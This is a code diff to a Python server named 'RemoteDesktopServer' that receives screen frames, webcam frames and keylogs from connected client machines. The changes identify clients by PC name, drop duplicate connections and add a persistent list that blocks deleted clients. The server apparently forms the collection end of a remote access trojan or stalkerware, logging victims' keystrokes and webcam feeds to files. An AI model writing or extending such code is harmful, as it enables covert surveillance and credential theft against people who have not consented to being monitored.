@@ -13,6 +13,7 @@ import io
 import threading
 import platform
 import datetime
+import json
 
 # Suppress specific warnings and errors
 warnings.filterwarnings('ignore', category=DeprecationWarning)
@@ -31,7 +32,8 @@ sys.path.insert(0, str(Path(__file__).parent.parent))
 
 from config import (
     DEFAULT_SERVER_HOST, DEFAULT_SERVER_PORT,
-    SERVER_CERT, SERVER_KEY, CA_CERT, SERVER_LOG, KEYLOG_FILE, KEYLOG_ENABLED
+    SERVER_CERT, SERVER_KEY, CA_CERT, SERVER_LOG, KEYLOG_FILE, KEYLOG_ENABLED,
+    SERVER_DATA_DIR, DELETED_CLIENTS_FILE
 )
 from common.protocol import FrameEncoder, ProtocolHandler, MessageType
 
@@ -103,6 +105,7 @@ class RemoteDesktopServer:
         self.clients = {}
         self.frame_buffer = {}
         self.webcam_buffer = {}  # Store webcam frames separately
+        self.deleted_clients = {}  # Store deleted clients: {client_id: {'name': pc_name}}
         self.gui_callback = None  # Callback for GUI notifications
         self.webcam_error_callback = None  # Callback for webcam errors
         
@@ -111,6 +114,38 @@ class RemoteDesktopServer:
             KEYLOG_FILE.parent.mkdir(parents=True, exist_ok=True)
             logger.info(f"Keylog file: {KEYLOG_FILE}")
         
+        # Setup server data directory
+        if SERVER_DATA_DIR:
+            SERVER_DATA_DIR.mkdir(parents=True, exist_ok=True)
+        
+        # Load deleted clients from file
+        self._load_deleted_clients()
+    
+    def _load_deleted_clients(self):
+        """Load deleted clients list from file"""
+        try:
+            if DELETED_CLIENTS_FILE.exists():
+                with open(DELETED_CLIENTS_FILE, 'r', encoding='utf-8') as f:
+                    self.deleted_clients = json.load(f)
+                logger.info(f"Loaded {len(self.deleted_clients)} deleted clients from {DELETED_CLIENTS_FILE}")
+            else:
+                self.deleted_clients = {}
+                logger.info("No deleted clients file found, starting with empty list")
+        except Exception as e:
+            logger.error(f"Error loading deleted clients file: {e}")
+            self.deleted_clients = {}
+    
+    def _save_deleted_clients(self):
+        """Save deleted clients list to file"""
+        try:
+            if SERVER_DATA_DIR:
+                SERVER_DATA_DIR.mkdir(parents=True, exist_ok=True)
+            with open(DELETED_CLIENTS_FILE, 'w', encoding='utf-8') as f:
+                json.dump(self.deleted_clients, f, indent=2, ensure_ascii=False)
+            logger.debug(f"Saved {len(self.deleted_clients)} deleted clients to {DELETED_CLIENTS_FILE}")
+        except Exception as e:
+            logger.error(f"Error saving deleted clients file: {e}")
+    
     def create_ssl_context(self):
         """Create SSL context for secure connection"""
         # Try embedded certificates first
@@ -231,23 +266,64 @@ class RemoteDesktopServer:
         except (asyncio.TimeoutError, ValueError) as e:
             logger.debug(f"Could not read display count from {client_id}: {e}, using default 1")
         
-        logger.info(f"Client connected: {pc_name} ({client_id})")
-        print(f"Client connected: {pc_name} ({client_id})")  # Also print to stdout for immediate visibility
+        # Use PC name as client_id (identify by machine name, not IP)
+        # If PC name is same as IP:port (couldn't read name), use IP:port to avoid collisions
+        if pc_name == client_id:
+            # Couldn't read PC name, use IP:port but make it clear
+            actual_client_id = client_id  # Keep IP:port format
+        else:
+            # Use PC name as primary identifier
+            actual_client_id = pc_name
+        
+        # Check if client with same PC name is already connected - disconnect old one
+        if actual_client_id in self.clients:
+            old_client = self.clients[actual_client_id]
+            old_writer = old_client.get('writer')
+            logger.info(f"Client {actual_client_id} already connected - disconnecting old connection")
+            print(f"Client {actual_client_id} already connected - disconnecting old connection")
+            # Close old connection
+            if old_writer and not old_writer.is_closing():
+                try:
+                    old_writer.close()
+                except:
+                    pass
+            # Clean up old client data
+            if actual_client_id in self.frame_buffer:
+                del self.frame_buffer[actual_client_id]
+            if actual_client_id in self.webcam_buffer:
+                del self.webcam_buffer[actual_client_id]
+            # Remove old client entry
+            del self.clients[actual_client_id]
+        
+        # Check if client is on deleted list (check by PC name)
+        if actual_client_id in self.deleted_clients:
+            logger.warning(f"Client {actual_client_id} is on deleted list - rejecting connection")
+            print(f"Client {actual_client_id} is on deleted list - rejecting connection")
+            try:
+                writer.close()
+                await writer.wait_closed()
+            except:
+                pass
+            return
+        
+        logger.info(f"Client connected: {actual_client_id} (IP: {client_id})")
+        print(f"Client connected: {actual_client_id} (IP: {client_id})")  # Also print to stdout for immediate visibility
         sys.stdout.flush()  # Force flush to ensure output appears
         
         # Alert: New client connected
-        self._alert_new_client(pc_name, client_id)
+        self._alert_new_client(pc_name, actual_client_id)
         
-        self.clients[client_id] = {
+        self.clients[actual_client_id] = {
             'reader': reader,
             'writer': writer,
             'frame_buffer': {},
             'pc_name': pc_name,  # Store PC name
+            'ip_address': client_id,  # Store IP:port for reference
             'display_count': display_count  # Store display count
         }
         
         try:
-            logger.debug(f"Starting message loop for {client_id} ({pc_name})")
+            logger.debug(f"Starting message loop for {actual_client_id} (IP: {client_id})")
             # Small delay to ensure connection is fully established before reading
             await asyncio.sleep(0.1)
             while True:
@@ -256,43 +332,48 @@ class RemoteDesktopServer:
                     try:
                         length_bytes = await asyncio.wait_for(reader.readexactly(4), timeout=30.0)
                     except asyncio.TimeoutError:
-                        logger.warning(f"Timeout waiting for data from {client_id}")
+                        logger.warning(f"Timeout waiting for data from {actual_client_id}")
                         # Send heartbeat request or just continue
                         continue
                     except asyncio.IncompleteReadError as ire:
                         # Check if we got partial data
                         if hasattr(ire, 'partial') and ire.partial:
                             partial_len = len(ire.partial)
-                            logger.info(f"Client {client_id} disconnected while reading length: got {partial_len}/4 bytes")
+                            logger.info(f"Client {actual_client_id} disconnected while reading length: got {partial_len}/4 bytes")
                         else:
-                            logger.info(f"Client {client_id} disconnected while reading length: connection closed (0 bytes received)")
+                            logger.info(f"Client {actual_client_id} disconnected while reading length: connection closed (0 bytes received)")
                         break
                     except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as e:
-                        logger.info(f"Client {client_id} connection reset while reading length: {e}")
+                        logger.info(f"Client {actual_client_id} connection reset while reading length: {e}")
                         break
                     
                     if not length_bytes or len(length_bytes) != 4:
-                        logger.warning(f"Invalid length bytes from {client_id}: {length_bytes}")
+                        logger.warning(f"Invalid length bytes from {actual_client_id}: {length_bytes}")
+                        break
+                    
+                    # Check if client was deleted while connected - reject data
+                    if actual_client_id in self.deleted_clients:
+                        logger.info(f"Client {actual_client_id} is on deleted list - rejecting data")
                         break
                     
                     try:
                         length = int.from_bytes(length_bytes, 'big')
                     except Exception as e:
-                        logger.error(f"Failed to parse length from {client_id}: {e}")
+                        logger.error(f"Failed to parse length from {actual_client_id}: {e}")
                         logger.error(f"Length bytes (hex): {length_bytes.hex()}, (raw): {length_bytes}")
                         break
                     
                     # Debug: Log length for first few messages
                     if frames_received < 5:
-                        logger.debug(f"Reading message from {client_id}: length={length} bytes (hex: {length_bytes.hex()})")
+                        logger.debug(f"Reading message from {actual_client_id}: length={length} bytes (hex: {length_bytes.hex()})")
                     
                     # Validate length (prevent DoS with huge messages)
                     if length <= 0:
-                        logger.warning(f"Invalid message length from {client_id}: {length} (must be > 0)")
+                        logger.warning(f"Invalid message length from {actual_client_id}: {length} (must be > 0)")
                         logger.warning(f"Length bytes (hex): {length_bytes.hex()}, (raw): {length_bytes}")
                         break
                     if length > 50 * 1024 * 1024:  # Max 50MB
-                        logger.error(f"Message too large from {client_id}: {length} bytes (max 50MB)")
+                        logger.error(f"Message too large from {actual_client_id}: {length} bytes (max 50MB)")
                         logger.error(f"Length bytes (hex): {length_bytes.hex()}, (raw): {length_bytes}")
                         logger.error(f"This usually indicates a protocol mismatch - client may be sending wrong format")
                         # Try to peek at what comes next to diagnose
@@ -310,36 +391,41 @@ class RemoteDesktopServer:
                     # Read message data
                     try:
                         if frames_received < 5:
-                            logger.debug(f"Reading {length} bytes from {client_id} (frame #{frames_received + 1})")
+                            logger.debug(f"Reading {length} bytes from {actual_client_id} (frame #{frames_received + 1})")
                         data = await asyncio.wait_for(reader.readexactly(length), timeout=60.0)
                         if frames_received < 5:
-                            logger.debug(f"Received {len(data)} bytes from {client_id} (frame #{frames_received + 1})")
+                            logger.debug(f"Received {len(data)} bytes from {actual_client_id} (frame #{frames_received + 1})")
                     except asyncio.TimeoutError:
-                        logger.warning(f"Timeout reading {length} bytes from {client_id} after {frames_received} frames")
+                        logger.warning(f"Timeout reading {length} bytes from {actual_client_id} after {frames_received} frames")
                         break
                     except asyncio.IncompleteReadError as ire:
                         partial_len = len(ire.partial) if hasattr(ire, 'partial') and ire.partial else 0
-                        logger.info(f"Client {client_id} disconnected (incomplete read: expected {length}, got {partial_len}) after {frames_received} frames")
+                        logger.info(f"Client {actual_client_id} disconnected (incomplete read: expected {length}, got {partial_len}) after {frames_received} frames")
                         break
                     except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as e:
-                        logger.info(f"Client {client_id} connection reset while reading: {e} (after {frames_received} frames)")
+                        logger.info(f"Client {actual_client_id} connection reset while reading: {e} (after {frames_received} frames)")
                         break
                     
                     if not data:
-                        logger.warning(f"No data received from {client_id} for length {length}")
+                        logger.warning(f"No data received from {actual_client_id} for length {length}")
                         break
                     if len(data) != length:
-                        logger.warning(f"Incomplete data from {client_id}: expected {length}, got {len(data)}")
+                        logger.warning(f"Incomplete data from {actual_client_id}: expected {length}, got {len(data)}")
                         break
                     
                     # Decode message
                     try:
                         # First, check message type to determine how to decode
                         if len(data) < 1:
-                            logger.warning(f"Message too short from {client_id}")
+                            logger.warning(f"Message too short from {actual_client_id}")
                             continue
                         
                         msg_type_byte = data[0]
+                        
+                        # Check if client is deleted - skip processing all messages
+                        if actual_client_id in self.deleted_clients:
+                            logger.debug(f"Client {actual_client_id} is deleted - skipping message processing")
+                            continue
                         
                         # Check if it's a frame message (SCREEN_FRAME or DELTA_UPDATE)
                         if msg_type_byte in (int(MessageType.SCREEN_FRAME), int(MessageType.DELTA_UPDATE)):
@@ -347,24 +433,24 @@ class RemoteDesktopServer:
                             
                             frames_received += 1
                             if frames_received <= 5 or frames_received % 10 == 0:
-                                pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
+                                pc_name = self.clients.get(actual_client_id, {}).get('pc_name', actual_client_id)
                                 logger.info(f"Received frame from {pc_name} (total: {frames_received}, type: {msg_type.name}, size: {len(frame_data)} bytes)")
                                 print(f"Received frame from {pc_name} (total: {frames_received})")  # Also print to stdout
                             
                             if msg_type == MessageType.SCREEN_FRAME:
                                 # Full frame
-                                self.frame_buffer[client_id] = {
+                                self.frame_buffer[actual_client_id] = {
                                     'frame_data': frame_data,
                                     'frame_id': frame_id,
                                     'is_delta': False
                                 }
-                                logger.debug(f"Received full frame from {client_id} ({len(frame_data)} bytes)")
+                                logger.debug(f"Received full frame from {actual_client_id} ({len(frame_data)} bytes)")
                             elif msg_type == MessageType.DELTA_UPDATE:
                                 # Delta update - apply to existing frame
-                                if client_id in self.frame_buffer:
+                                if actual_client_id in self.frame_buffer:
                                     # In a real implementation, you'd merge the delta
                                     # For simplicity, we'll just update the buffer
-                                    self.frame_buffer[client_id] = {
+                                    self.frame_buffer[actual_client_id] = {
                                         'frame_data': frame_data,
                                         'frame_id': frame_id,
                                         'is_delta': True,
@@ -372,24 +458,24 @@ class RemoteDesktopServer:
                                     }
                                 else:
                                     # No previous frame, treat as full frame
-                                    self.frame_buffer[client_id] = {
+                                    self.frame_buffer[actual_client_id] = {
                                         'frame_data': frame_data,
                                         'frame_id': frame_id,
                                         'is_delta': False
                                     }
                         elif msg_type_byte == int(MessageType.HEARTBEAT):
                             # Heartbeat - just acknowledge
-                            logger.debug(f"Received heartbeat from {client_id}")
+                            logger.debug(f"Received heartbeat from {actual_client_id}")
                         elif msg_type_byte == int(MessageType.WEBCAM_FRAME):
                             # Webcam frame - decode and store
                             try:
                                 msg_type, msg_data = ProtocolHandler.decode_message(data)
                                 # msg_data is already decompressed by decode_message for WEBCAM_FRAME
-                                self.webcam_buffer[client_id] = {
+                                self.webcam_buffer[actual_client_id] = {
                                     'frame_data': msg_data,
                                     'timestamp': datetime.datetime.now()
                                 }
-                                logger.debug(f"Received webcam frame from {client_id} ({len(msg_data)} bytes)")
+                                logger.debug(f"Received webcam frame from {actual_client_id} ({len(msg_data)} bytes)")
                             except Exception as decode_err:
                                 logger.error(f"Failed to decode webcam frame: {decode_err}")
                         elif msg_type_byte == int(MessageType.WEBCAM_ERROR):
@@ -397,44 +483,25 @@ class RemoteDesktopServer:
                             try:
                                 msg_type, msg_data = ProtocolHandler.decode_message(data)
                                 error_msg = msg_data.decode('utf-8')
-                                logger.warning(f"Webcam error from {client_id}: {error_msg}")
+                                logger.warning(f"Webcam error from {actual_client_id}: {error_msg}")
                                 # Clear webcam buffer on error
-                                if client_id in self.webcam_buffer:
-                                    del self.webcam_buffer[client_id]
+                                if actual_client_id in self.webcam_buffer:
+                                    del self.webcam_buffer[actual_client_id]
                                 # Forward to web interface if callback is set
                                 if self.webcam_error_callback:
                                     try:
-                                        self.webcam_error_callback(client_id, error_msg)
+                                        self.webcam_error_callback(actual_client_id, error_msg)
                                     except Exception as cb_err:
                                         logger.error(f"Error in webcam error callback: {cb_err}")
                             except Exception as decode_err:
                                 logger.error(f"Failed to decode webcam error: {decode_err}")
-                        elif msg_type_byte == int(MessageType.LOCK_STATUS):
-                            # Lock status message
-                            try:
-                                msg_type, msg_data = ProtocolHandler.decode_message(data)
-                                import json
-                                lock_data = json.loads(msg_data.decode('utf-8'))
-                                is_locked = lock_data.get('locked', False)
-                                lock_type = lock_data.get('type', 'unknown')
-                                
-                                pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
-                                logger.info(f"Lock status from {pc_name}: locked={is_locked}, type={lock_type}")
-                                
-                                # Update client state in web server
-                                # This will be picked up by the web interface
-                                if hasattr(self, 'lock_status_callback') and self.lock_status_callback:
-                                    self.lock_status_callback(client_id, is_locked, lock_type)
-                                    
-                            except Exception as decode_err:
-                                logger.error(f"Failed to decode lock status: {decode_err}")
                         elif msg_type_byte == int(MessageType.KEYLOG):
                             # Keylog message
-                            logger.info(f"Received KEYLOG message from {client_id}")
+                            logger.info(f"Received KEYLOG message from {actual_client_id}")
                             try:
                                 msg_type, msg_data = ProtocolHandler.decode_message(data)
                                 log_content = msg_data.decode('utf-8')
-                                pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
+                                pc_name = self.clients.get(actual_client_id, {}).get('pc_name', actual_client_id)
                                 logger.info(f"Keylog from {pc_name}: {len(log_content)} characters")
                                 
                                 # Save to file if enabled
@@ -463,15 +530,15 @@ class RemoteDesktopServer:
                                 import traceback
                                 logger.error(traceback.format_exc())
                         else:
-                            logger.warning(f"Unknown message type from {client_id}: {msg_type_byte}")
+                            logger.warning(f"Unknown message type from {actual_client_id}: {msg_type_byte}")
                         
                     except ValueError as ve:
-                        logger.warning(f"Frame decode error (ValueError) from {client_id}: {ve} - skipping frame")
+                        logger.warning(f"Frame decode error (ValueError) from {actual_client_id}: {ve} - skipping frame")
                         logger.debug(f"Data length: {len(data)}, first 20 bytes: {data[:20] if len(data) >= 20 else data}")
                         # Don't close connection - just skip this frame
                         continue
                     except Exception as e:
-                        logger.error(f"Error decoding frame from {client_id}: {type(e).__name__}: {e}")
+                        logger.error(f"Error decoding frame from {actual_client_id}: {type(e).__name__}: {e}")
                         logger.error(f"Data length: {len(data)}, first 50 bytes: {data[:50] if len(data) >= 50 else data}")
                         import traceback
                         logger.error(f"Decode traceback: {traceback.format_exc()}")
@@ -479,43 +546,46 @@ class RemoteDesktopServer:
                         continue
                         
                 except asyncio.IncompleteReadError as ire:
-                    logger.info(f"Client {client_id} disconnected (incomplete read)")
+                    logger.info(f"Client {actual_client_id} disconnected (incomplete read)")
                     break
                 except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
-                    logger.info(f"Client {client_id} connection reset: {conn_err}")
+                    logger.info(f"Client {actual_client_id} connection reset: {conn_err}")
                     break
                 except OSError as ose:
-                    logger.info(f"Client {client_id} OS error: {ose}")
+                    logger.info(f"Client {actual_client_id} OS error: {ose}")
                     break
                 
         except asyncio.IncompleteReadError:
-            pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
-            logger.info(f"Client disconnected: {pc_name} ({client_id}) (received {frames_received} frames)")
+            pc_name = self.clients.get(actual_client_id, {}).get('pc_name', actual_client_id) if 'actual_client_id' in locals() else "unknown"
+            logger.info(f"Client disconnected: {pc_name} (received {frames_received} frames)")
         except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError) as e:
-            pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
-            logger.info(f"Client connection reset: {pc_name} ({client_id}) - {e} (received {frames_received} frames)")
+            pc_name = self.clients.get(actual_client_id, {}).get('pc_name', actual_client_id) if 'actual_client_id' in locals() else "unknown"
+            logger.info(f"Client connection reset: {pc_name} - {e} (received {frames_received} frames)")
         except Exception as e:
-            logger.error(f"Error handling client {client_id}: {type(e).__name__}: {e} (received {frames_received} frames)")
+            pc_name = self.clients.get(actual_client_id, {}).get('pc_name', actual_client_id) if 'actual_client_id' in locals() else "unknown"
+            logger.error(f"Error handling client {pc_name}: {type(e).__name__}: {e} (received {frames_received} frames)")
             import traceback
             logger.error(f"Traceback: {traceback.format_exc()}")
-            print(f"ERROR handling client {client_id}: {e}")  # Also print to stdout
+            print(f"ERROR handling client {pc_name}: {e}")  # Also print to stdout
             traceback.print_exc()  # Print to stdout as well
         finally:
-            logger.info(f"Cleaning up client {client_id} (total frames received: {frames_received})")
-            print(f"Cleaning up client {client_id} (total frames received: {frames_received})")  # Also print to stdout
-            if client_id in self.clients:
-                del self.clients[client_id]
-            if client_id in self.frame_buffer:
-                del self.frame_buffer[client_id]
-            if client_id in self.webcam_buffer:
-                del self.webcam_buffer[client_id]
+            if 'actual_client_id' in locals():
+                logger.info(f"Cleaning up client {actual_client_id} (total frames received: {frames_received})")
+                print(f"Cleaning up client {actual_client_id} (total frames received: {frames_received})")  # Also print to stdout
+                if actual_client_id in self.clients:
+                    del self.clients[actual_client_id]
+                if actual_client_id in self.frame_buffer:
+                    del self.frame_buffer[actual_client_id]
+                if actual_client_id in self.webcam_buffer:
+                    del self.webcam_buffer[actual_client_id]
             try:
                 if not writer.is_closing():
                     writer.close()
                     await writer.wait_closed()
             except Exception as cleanup_err:
-                logger.debug(f"Error during cleanup for {client_id}: {cleanup_err}")
-                print(f"Error during cleanup for {client_id}: {cleanup_err}")  # Also print to stdout
+                if 'actual_client_id' in locals():
+                    logger.debug(f"Error during cleanup for {actual_client_id}: {cleanup_err}")
+                    print(f"Error during cleanup for {actual_client_id}: {cleanup_err}")  # Also print to stdout
     
     async def start_server(self):
         """Start the server"""
